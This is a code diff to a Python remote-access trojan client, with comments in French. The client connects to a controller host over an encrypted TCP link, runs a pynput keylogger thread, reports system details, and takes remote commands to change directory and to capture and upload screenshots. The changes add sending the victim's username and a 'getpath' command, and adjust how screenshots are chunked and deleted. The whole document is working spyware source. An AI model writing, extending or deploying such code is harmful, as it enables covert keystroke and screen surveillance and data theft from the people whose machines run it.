@@ -1,6 +1,6 @@
 #!/usr/bin/python3.7
 # -*- coding: utf-8 -*
-import socket, subprocess, os, platform, logging, threading,time, encrypted_connection
+import socket, subprocess, os, platform, logging, threading,time,getpass, encrypted_connection
 import pyscreenshot as ImageGrab
 from PIL import ImageGrab
 from pynput.keyboard import Key, Listener
@@ -26,7 +26,7 @@ encrypter = encrypted_connection.encrypter(b"d41d8cd98f00b205")
 encrypter.initialize_tcp_connexion_client(HOST,PORT)
 KeyLoggerThread = KeyLoggerThread()
 KeyLoggerThread.start()
-encrypter.send_message_client("Nom : "+os.name+"\nSysteme : "+platform.system()+"\nKernel : "+ platform.release())
+encrypter.send_message_client("Nom : "+os.name+"\nSysteme : "+platform.system()+"\nKernel : "+ platform.release() + "\nUser : "+getpass.getuser())
  
 while True:
     command = ""
@@ -40,24 +40,28 @@ while True:
             elif len(command.split()) == 2:
                 try:
                     os.chdir(command.split()[1])
-                    encrypter.send_message_client(("Changed directory to " + os.getcwd()))
+                    encrypter.send_message_client(("Directory : " + os.getcwd()))
                 except OSError as winerror:
-                    encrypter.send_message_client(("No such directory : " +os.getcwd()))
+                    encrypter.send_message_client(("No such directory in : " +os.getcwd()))
+    elif command == "getpath" :
+        encrypter.send_message_client(os.getcwd())
     elif command == "stb" :
         im = ImageGrab.grab()
         try :
             im.save('pic.png')
             encrypter.send_message_client(("capturing"))
             pic = open("pic.png", "rb")
-            picRead = pic.read(2048)
+            picRead = pic.read(4096-32)
             while picRead != b'':
                 encrypter.send_picture_client(picRead)
-                picRead = pic.read(2048)
+                picRead = pic.read(4096-32)
             pic.close()
-            os.remove("pic.png")
-            encrypter.send_message_client(("complete"))
+            #os.remove("pic.png")
+            time.sleep(0.5)
+            encrypter.send_picture_client(b'completed')
         except:
             encrypter.send_message_client(("permissionsfailed"))
+        os.remove('pic.png')
 
     elif command == "keylogger.status" :
         if KeyLoggerThread.isAlive() :
